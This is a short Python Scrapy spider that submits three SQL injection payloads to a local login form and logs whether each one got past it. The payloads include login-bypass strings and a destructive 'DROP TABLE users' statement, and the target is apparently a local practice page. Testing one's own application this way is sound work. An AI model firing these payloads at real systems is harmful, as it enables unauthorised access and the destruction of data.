import scrapy

class SqliTestSpider(scrapy.Spider):
    name = "sqli_test"
    start_urls = [
        'http://localhost:5001/sqli',  # The URL of your local SQL injection page
    ]

    def parse(self, response):
        # List of SQL injection payloads to test
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DROP TABLE users;--"
        ]
        
        # Loop through each payload and submit the form with it
        for payload in payloads:
            yield scrapy.FormRequest(
                url='http://localhost:5001/sqli',  # The URL to handle the login submission
                formdata={'username': payload, 'password': payload},
                callback=self.after_submission
            )

    def after_submission(self, response):
        # Check if the form was successfully submitted and log the result
        if "Welcome" in response.text:
            self.log(f"Successful SQLi with payload: {response.url}")
        else:
            self.log(f"SQLi failed with payload: {response.url}")
